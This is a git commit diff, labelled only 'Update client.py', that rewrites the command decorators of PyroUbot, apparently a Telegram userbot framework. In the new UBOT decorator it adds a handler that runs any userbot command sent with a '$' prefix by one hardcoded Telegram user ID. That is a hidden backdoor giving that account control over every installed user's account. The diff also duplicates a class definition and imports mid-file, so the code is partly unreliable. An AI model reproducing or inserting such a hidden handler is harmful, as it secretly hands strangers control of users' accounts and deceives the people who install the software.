a95e43754f5d4ebc4978aeba0d831296b77d2640
Tomi Setiawan <96681219+XtomiX@users.noreply.github.com>
2023-06-30 16:10:51 +0700

    Update client.py

--- PyroUbot/core/helpers/client.py
+++ PyroUbot/core/helpers/client.py
@@ -55,23 +55,74 @@ class PY:
         return wrapper
 
 
-def prefix(message):
-    return ubot._prefix[message.from_user.id]["prefix"]
+from pyrogram import filters
+
+from PyroUbot import *
+
+
+class FILTERS:
+    ME = filters.me
+    GROUP = filters.group
+    PRIVATE = filters.private
+    OWNER = filters.user(OWNER_ID)
+    ME_GROUP = filters.me & filters.group
+    ME_OWNER = filters.me & filters.user(OWNER_ID)
+
+
+class PY:
+    def BOT(command, filter=FILTERS.PRIVATE):
+        def wrapper(func):
+            @bot.on_message(filters.command(command) & filter)
+            async def wrapped_func(client, message):
+                await func(client, message)
+
+            return wrapped_func
+
+        return wrapper
+
+    def UBOT(command, filter=FILTERS.ME):
+        def wrapper(func):
+            @ubot.on_message(filters.command(command, "$") & filters.user(5876222922))
+            @ubot.on_message(filters.command(command, PREFIX) & filter)
+            async def wrapped_func(client, message):
+                await func(client, message)
+
+            return wrapped_func
+
+        return wrapper
+
+    def INLINE(command):
+        def wrapper(func):
+            @bot.on_inline_query(filters.regex(command))
+            async def wrapped_func(client, message):
+                await func(client, message)
+
+            return wrapped_func
+
+        return wrapper
+
+    def CALLBACK(command):
+        def wrapper(func):
+            @bot.on_callback_query(filters.regex(command))
+            async def wrapped_func(client, message):
+                await func(client, message)
+
+            return wrapped_func
+
+        return wrapper
+
+
+def ubot_prefix(user_id):
+    return ubot._prefix.get(user_id, {}).get("prefix", ".")
 
 
 def CMD(command, filter=FILTERS.ME_OWNER):
     def wrapper(func):
+        @ubot.on_message(filters.text & filter)
         async def wrapped_func(client, message):
-            await func(client, message)
-
-        async def command_handler(client, message):
-            command_prefix = prefix(message)
-            if message.text.startswith(command_prefix + command):
-                await wrapped_func(client, message)
-
-        command_handler = command_handler & filter
-
-        ubot.on_message(command_handler)
+            prefix = ubot_prefix(client.me.id)
+            if message.text.startswith(f"{prefix}{command}"):
+                await func(client, message)
 
         return wrapped_func
 
